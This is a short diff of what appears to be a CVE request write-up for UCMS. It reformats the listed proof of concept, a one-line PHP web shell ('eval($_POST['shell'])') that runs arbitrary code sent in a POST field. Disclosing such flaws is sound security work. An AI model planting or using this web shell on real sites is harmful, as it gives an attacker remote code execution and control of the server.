@@ -22,7 +22,7 @@ Put the request just in the root directory
 
 ![submit](https://github.com/mySQLserver010/CVE_Request/blob/master/CVE_Request/img/UCMS3.png)
 
-found the poc： (<?php eval($_POST['shell']);?>)
+found the poc： php eval($_POST['shell']);
 
 ![submit](https://github.com/mySQLserver010/CVE_Request/blob/master/CVE_Request/img/UCMS5.png)
 
